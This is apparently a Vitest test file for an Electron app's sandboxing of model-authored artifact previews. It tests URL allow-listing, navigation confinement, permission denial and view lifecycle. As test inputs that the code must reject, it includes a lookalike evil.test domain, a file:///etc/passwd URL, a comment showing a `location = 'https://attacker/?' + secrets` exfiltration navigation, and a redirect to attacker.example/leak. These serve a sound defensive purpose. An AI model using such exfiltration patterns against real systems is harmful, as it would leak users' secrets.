import { describe, expect, it, vi } from 'vitest';

import {
  ArtifactPreviewController,
  applyGlobalNavigationPolicy,
  artifactPartition,
  artifactWebPreferences,
  clampBounds,
  confineToArtifactOrigin,
  isArtifactUrl,
  loadArtifactInitialUrl,
  PREVIEW_CORNER_RADIUS,
  type PreviewBounds,
} from './artifact-viewers';

describe('the global navigation fence handoff', () => {
  it('defers artifact navigation before preventing it', () => {
    const preventDefault = vi.fn();
    const openExternal = vi.fn();
    applyGlobalNavigationPolicy({
      event: { preventDefault },
      url: `${ORIGIN}/__rally/redeem`,
      artifactSurface: true,
      rendererAllowed: () => false,
      externalAllowed: () => true,
      openExternal,
    });

    expect(preventDefault).not.toHaveBeenCalled();
    expect(openExternal).not.toHaveBeenCalled();
  });

  it('still blocks and hands an ordinary external navigation to the browser', () => {
    const preventDefault = vi.fn();
    const openExternal = vi.fn();
    applyGlobalNavigationPolicy({
      event: { preventDefault },
      url: 'https://example.test/',
      artifactSurface: false,
      rendererAllowed: () => false,
      externalAllowed: () => true,
      openExternal,
    });

    expect(preventDefault).toHaveBeenCalledOnce();
    expect(openExternal).toHaveBeenCalledWith('https://example.test/');
  });
});

const DOMAIN = 'rallyusercontent.test';
const ARTIFACT = '3f2504e0-4f89-41d3-9a0c-0305e82c3301';
const OTHER_ARTIFACT = '00000000-0000-4000-8000-000000000002';
const ORIGIN = `https://${ARTIFACT}-g.${DOMAIN}`;

describe('what the main process will load into an artifact surface', () => {
  it('accepts an artifact origin on the serving domain', () => {
    expect(isArtifactUrl(`${ORIGIN}/`, DOMAIN)).toBe(true);
    expect(isArtifactUrl(`${ORIGIN}/__rally/open#code`, DOMAIN)).toBe(true);
  });

  it('refuses a lookalike domain that merely contains the serving domain', () => {
    // Matched on a label boundary, so a suffix attack does not pass.
    expect(isArtifactUrl(`https://${DOMAIN}.evil.test/`, DOMAIN)).toBe(false);
    expect(isArtifactUrl(`https://not${DOMAIN}/`, DOMAIN)).toBe(false);
  });

  it('refuses unrecognized and nested labels inside the serving domain', () => {
    expect(isArtifactUrl(`https://arbitrary.${DOMAIN}/`, DOMAIN)).toBe(false);
    expect(isArtifactUrl(`https://foo.bar.${DOMAIN}/`, DOMAIN)).toBe(false);
    expect(isArtifactUrl(`https://${DOMAIN}/`, DOMAIN)).toBe(false);
  });

  it('refuses the application, the API, and anything not https', () => {
    // This function is the whole capability the renderer does not get: pointing
    // an artifact surface at Rally's own origin would put model-authored code
    // where the app's cookies are.
    expect(isArtifactUrl('https://rallywith.ai/app', DOMAIN)).toBe(false);
    expect(isArtifactUrl('https://api.rallywith.ai/', DOMAIN)).toBe(false);
    expect(isArtifactUrl(`http://${ARTIFACT}-g.${DOMAIN}/`, DOMAIN)).toBe(false);
    expect(isArtifactUrl(`file:///etc/passwd`, DOMAIN)).toBe(false);
    expect(isArtifactUrl('app://rallywithai/index.html', DOMAIN)).toBe(false);
    expect(isArtifactUrl('not a url', DOMAIN)).toBe(false);
  });
});

describe('the preview rectangle', () => {
  const window = { width: 1_200, height: 800 };

  it('passes a rectangle that already fits', () => {
    expect(clampBounds({ x: 900, y: 100, width: 280, height: 400 }, window))
      .toEqual({ x: 900, y: 100, width: 280, height: 400 });
  });

  it('clamps a rectangle that would cover the whole window', () => {
    // The renderer measures this, so it is a request rather than an
    // instruction: a wrong one must not paint artifact content over the chrome
    // a person needs to escape it.
    expect(clampBounds({ x: 900, y: 100, width: 5_000, height: 5_000 }, window))
      .toEqual({ x: 900, y: 100, width: 300, height: 700 });
  });

  it('clamps negative and out-of-window origins', () => {
    expect(clampBounds({ x: -50, y: -50, width: 100, height: 100 }, window))
      .toEqual({ x: 0, y: 0, width: 100, height: 100 });
    expect(clampBounds({ x: 9_000, y: 9_000, width: 100, height: 100 }, window))
      .toEqual({ x: 1_200, y: 800, width: 0, height: 0 });
  });

  it('rounds rather than passing fractional pixels through', () => {
    expect(clampBounds({ x: 10.4, y: 10.6, width: 100.5, height: 100.4 }, window))
      .toEqual({ x: 10, y: 11, width: 101, height: 100 });
  });
});

describe('the isolation contract both surfaces share', () => {
  it('gives artifact content no preload, no Node, and a sandbox', () => {
    const preferences = artifactWebPreferences(ARTIFACT, true);
    // A preload is a capability, and model-authored content is the last content
    // that should hold one.
    expect(preferences).not.toHaveProperty('preload');
    expect(preferences.nodeIntegration).toBe(false);
    expect(preferences.sandbox).toBe(true);
    expect(preferences.contextIsolation).toBe(true);
    expect(preferences.webSecurity).toBe(true);
    expect(preferences.allowRunningInsecureContent).toBe(false);
  });

  it('closes DevTools outside development', () => {
    expect(artifactWebPreferences(ARTIFACT, true).devTools).toBe(false);
    expect(artifactWebPreferences(ARTIFACT, false).devTools).toBe(true);
  });

  it('partitions per artifact, and shares that partition between both surfaces', () => {
    // Per artifact so one cannot read another's storage; shared between the
    // rail preview and the pop-out so a person authorizes once.
    expect(artifactPartition(ARTIFACT)).toBe(`persist:artifact-${ARTIFACT}`);
    expect(artifactPartition(ARTIFACT)).not.toBe(artifactPartition('other'));
    expect(artifactWebPreferences(ARTIFACT, true).partition).toBe(artifactPartition(ARTIFACT));
  });
});

describe('confining a surface to its artifact', () => {
  function contents() {
    const handlers: {
      navigate?: (event: { preventDefault(): void }, url: string) => void;
      redirect?: (event: { preventDefault(): void }, url: string) => void;
    } = {};
    let windowOpen: ((details: { url: string }) => { action: 'deny' }) | null = null;
    let permission: ((c: unknown, p: string, cb: (allowed: boolean) => void) => void) | null = null;
    return {
      handlers,
      openWindow: (url: string) => windowOpen?.({ url }),
      requestPermission: (name: string) => {
        const answers: boolean[] = [];
        permission?.(null, name, (allowed) => answers.push(allowed));
        return answers;
      },
      stub: {
        on(
          event: 'will-navigate' | 'will-redirect',
          handler: (event: { preventDefault(): void }, url: string) => void,
        ) {
          if (event === 'will-navigate') handlers.navigate = handler;
          else handlers.redirect = handler;
        },
        setWindowOpenHandler(handler: (details: { url: string }) => { action: 'deny' }) {
          windowOpen = handler;
        },
        session: {
          setPermissionRequestHandler(
            handler: (c: unknown, p: string, cb: (allowed: boolean) => void) => void,
          ) {
            permission = handler;
          },
        },
      },
    };
  }

  it('lets the artifact navigate within its own origin', () => {
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN);
    const event = { preventDefault: vi.fn() };
    surface.handlers.navigate?.(event, `${ORIGIN}/about`);
    expect(event.preventDefault).not.toHaveBeenCalled();
  });

  it('refuses an off-origin navigation and hands it to nobody', () => {
    // A URL an artifact composes is a URL model-authored code chose, and
    // `location = "https://attacker/?" + secrets` is a navigation the CSP's
    // connect-src and form-action do not touch. Opening it externally would
    // make Rally perform the exfiltration the egress fence exists to prevent.
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN);
    for (const url of ['https://example.com/docs', `https://other-g.${DOMAIN}/`, 'https://rallywith.ai/app']) {
      const event = { preventDefault: vi.fn() };
      surface.handlers.navigate?.(event, url);
      expect(event.preventDefault, url).toHaveBeenCalled();
    }
  });

  it('allows same-origin redirects and refuses redirects that leave the artifact', () => {
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN);
    const sameOrigin = { preventDefault: vi.fn() };
    surface.handlers.redirect?.(sameOrigin, `${ORIGIN}/__rally/redeem`);
    expect(sameOrigin.preventDefault).not.toHaveBeenCalled();

    const offOrigin = { preventDefault: vi.fn() };
    surface.handlers.redirect?.(offOrigin, 'https://attacker.example/leak');
    expect(offOrigin.preventDefault).toHaveBeenCalledOnce();
  });

  it('denies window.open outright rather than redirecting it anywhere', () => {
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN);
    expect(surface.openWindow('https://example.com')).toEqual({ action: 'deny' });
  });

  it('denies every permission request outright', () => {
    // A camera prompt that appears to come from Rally is worse than one that
    // never appears.
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN);
    for (const permission of ['media', 'geolocation', 'notifications', 'clipboard-read']) {
      expect(surface.requestPermission(permission), permission).toEqual([false]);
    }
  });
});

describe('the rail preview controller', () => {
  function harness(
    servingDomain = DOMAIN,
    loadFailure: Error | null = null,
    load?: (url: string) => Promise<void>,
  ) {
    const views: {
      url: string | null;
      bounds: PreviewBounds[];
      radii: number[];
      closed: boolean;
      destroyed: boolean;
    }[] = [];
    const removed: unknown[] = [];
    // Both surfaces can be destroyed by Electron rather than by this
    // controller, so the harness lets a test say so.
    const host = { destroyed: false };
    const controller = new ArtifactPreviewController(
      {
        destroyed: () => host.destroyed,
        contentSize: () => ({ width: 1_200, height: 800 }),
        removeView: (view) => removed.push(view),
      },
      servingDomain,
      () => {
        const state = {
          url: null as string | null,
          bounds: [] as PreviewBounds[],
          radii: [] as number[],
          closed: false,
          destroyed: false,
        };
        views.push(state);
        return {
          // Electron owns a window's view tree: destroying the window destroys
          // every view under it, so the fake cannot let one outlive the other.
          destroyed: () => host.destroyed || state.destroyed,
          setBounds: (bounds: PreviewBounds) => state.bounds.push(bounds),
          setBorderRadius: (radius: number) => state.radii.push(radius),
          loadURL: async (url: string) => {
            state.url = url;
            if (load) return await load(url);
            if (loadFailure) throw loadFailure;
          },
          close: () => { state.closed = true; },
        };
      },
    );
    return { controller, views, removed, host };
  }

  const bounds = { x: 900, y: 100, width: 280, height: 400 };

  it('presents an artifact and positions it over the rail', async () => {
    const { controller, views } = harness();
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds })).toBe(true);
    expect(views).toHaveLength(1);
    expect(views[0]?.url).toBe(`${ORIGIN}/`);
    expect(views[0]?.bounds.at(-1)).toEqual(bounds);
  });

  it('rounds the view once, so a scrolling rectangle does not carry the corner', async () => {
    // The view reaches the bottom corners of the dialog holding it, and CSS
    // cannot round a native view. The corner belongs to the surface rather
    // than to a layout: `setBounds` runs on every scroll frame.
    const { controller, views } = harness();
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds })).toBe(true);
    controller.setBounds({ ...bounds, y: 40 });
    controller.setBounds({ ...bounds, y: 80 });
    expect(views[0]?.radii).toEqual([PREVIEW_CORNER_RADIUS]);
  });

  it('refuses a URL that is not an artifact, and creates nothing', async () => {
    const { controller, views } = harness();
    expect(await controller.present({ artifactId: ARTIFACT, url: 'https://rallywith.ai/app', bounds })).toBe(false);
    expect(views).toHaveLength(0);
    expect(controller.currentArtifactId()).toBeNull();
  });

  it('reports a failed navigation and removes the empty composited view', async () => {
    const { controller, views, removed } = harness(DOMAIN, new Error('ERR_NAME_NOT_RESOLVED'));
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds })).toBe(false);
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
    expect(controller.currentArtifactId()).toBeNull();
  });

  it('keeps the view when the bootstrap replaces its load with redemption', async () => {
    const aborted = Object.assign(new Error('ERR_ABORTED (-3)'), { code: 'ERR_ABORTED', errno: -3 });
    const { controller, views, removed } = harness(DOMAIN, aborted);
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/__rally/open#code`, bounds }))
      .toBe(true);
    expect(views[0]?.closed).toBe(false);
    expect(removed).toHaveLength(0);
  });

  it('makes concurrent presenters await the same failed initial load', async () => {
    let rejectLoad!: (error: Error) => void;
    const load = new Promise<void>((_resolve, reject) => { rejectLoad = reject; });
    const { controller, views, removed } = harness(DOMAIN, null, async () => await load);
    const first = controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    const second = controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    expect(views).toHaveLength(1);
    rejectLoad(new Error('ERR_NAME_NOT_RESOLVED'));
    await expect(Promise.all([first, second])).resolves.toEqual([false, false]);
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
  });

  it('keeps at most one view per window, reusing it for the same artifact', async () => {
    // Two would mean two artifacts painting over one rectangle, and the one
    // underneath would still be running.
    const { controller, views } = harness();
    await Promise.all([
      controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds }),
      controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds }),
    ]);
    expect(views).toHaveLength(1);
    expect(views[0]?.closed).toBe(false);
  });

  it('replaces the view when the artifact changes', () => {
    const { controller, views, removed } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.present({
      artifactId: OTHER_ARTIFACT,
      url: `https://${OTHER_ARTIFACT}-g.${DOMAIN}/`,
      bounds,
    });
    expect(views).toHaveLength(2);
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
    expect(controller.currentArtifactId()).toBe(OTHER_ARTIFACT);
  });

  it('collapses to nothing while an app overlay is open, and restores after', () => {
    // A WebContentsView composites above the renderer's DOM, so a dialog or the
    // command palette would otherwise be painted over by artifact content.
    const { controller, views } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.setOverlayOpen(true);
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 0, y: 0, width: 0, height: 0 });
    controller.setOverlayOpen(false);
    expect(views[0]?.bounds.at(-1)).toEqual(bounds);
    // Collapsed rather than destroyed: the page keeps its state, so closing a
    // dialog restores what the person was looking at.
    expect(views[0]?.closed).toBe(false);
    expect(views).toHaveLength(1);
  });

  it('stays hidden through a layout change while an overlay is open', () => {
    const { controller, views } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.setOverlayOpen(true);
    controller.setBounds({ x: 500, y: 50, width: 400, height: 500 });
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 0, y: 0, width: 0, height: 0 });
  });

  it('clamps a layout update to the window', () => {
    const { controller, views } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.setBounds({ x: 900, y: 100, width: 9_000, height: 9_000 });
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 900, y: 100, width: 300, height: 700 });
  });

  it('destroys the view and forgets the artifact', () => {
    const { controller, views, removed } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.destroy();
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
    expect(controller.currentArtifactId()).toBeNull();
    // Idempotent: a second close must not remove a view twice.
    controller.destroy();
    expect(removed).toHaveLength(1);
  });

  it('touches nothing when the window it was composited over is already gone', async () => {
    const { controller, views, removed, host } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    // How quitting to install an update reaches this controller: Electron
    // destroys the window, and the window's own `closed` handler tears the
    // preview down afterwards. Detaching or closing anything here throws
    // `Object has been destroyed` out of an event handler, which the main
    // process reports as an uncaught exception instead of quitting.
    host.destroyed = true;
    controller.destroy();
    expect(removed).toHaveLength(0);
    expect(views[0]?.closed).toBe(false);
    expect(controller.currentArtifactId()).toBeNull();
  });

  it('detaches a view whose contents closed themselves, without closing it again', async () => {
    const { controller, views, removed } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    views[0]!.destroyed = true;
    controller.destroy();
    // The window is still alive and still holding the child, so the detach has
    // to happen; only the second close would throw.
    expect(removed).toHaveLength(1);
    expect(views[0]?.closed).toBe(false);
    // Idempotent here too. This is the path where it is not obvious: the
    // window is alive, so nothing else would stop a second detach.
    controller.destroy();
    expect(removed).toHaveLength(1);
  });

  it('replaces a view whose contents closed themselves rather than reporting it live', async () => {
    const { controller, views, removed } = harness();
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds })).toBe(true);
    // An artifact page calling `window.close()`. The handle stays, and it is
    // still this artifact's, so the artifact-ID comparison alone would keep it.
    views[0]!.destroyed = true;
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds })).toBe(true);
    expect(views).toHaveLength(2);
    expect(views[1]?.url).toBe(`${ORIGIN}/`);
    expect(views[1]?.bounds.at(-1)).toEqual(bounds);
    // The dead one is detached from the window that is still holding it.
    expect(removed).toHaveLength(1);
  });

  it('stops laying out a view whose contents closed themselves', async () => {
    const { controller, views } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    const laidOut = views[0]!.bounds.length;
    // The window is alive, so the window half of the layout guard does not
    // apply. The rail goes on sending layout updates — a resize — because it
    // has no way to learn the preview died under it.
    views[0]!.destroyed = true;
    controller.setBounds({ x: 100, y: 100, width: 200, height: 200 });
    controller.setOverlayOpen(true);
    expect(views[0]?.bounds).toHaveLength(laidOut);
  });

  it('refuses to lay out or present over a window that is gone', async () => {
    const { controller, views, host } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    const laidOut = views[0]!.bounds.length;
    host.destroyed = true;
    controller.setBounds({ x: 100, y: 100, width: 200, height: 200 });
    controller.setOverlayOpen(true);
    expect(views[0]?.bounds).toHaveLength(laidOut);
    expect(await controller.present({ artifactId: 'other', url: `${ORIGIN}/`, bounds })).toBe(false);
    expect(views).toHaveLength(1);
  });
});

describe('artifact initial loading', () => {
  it('distinguishes the bootstrap handoff from a terminal load failure', async () => {
    await expect(loadArtifactInitialUrl(async () => {
      throw Object.assign(new Error('aborted'), { code: 'ERR_ABORTED', errno: -3 });
    })).resolves.toBe(true);
    await expect(loadArtifactInitialUrl(async () => {
      throw Object.assign(new Error('dns'), { code: 'ERR_NAME_NOT_RESOLVED', errno: -105 });
    })).resolves.toBe(false);
  });
});
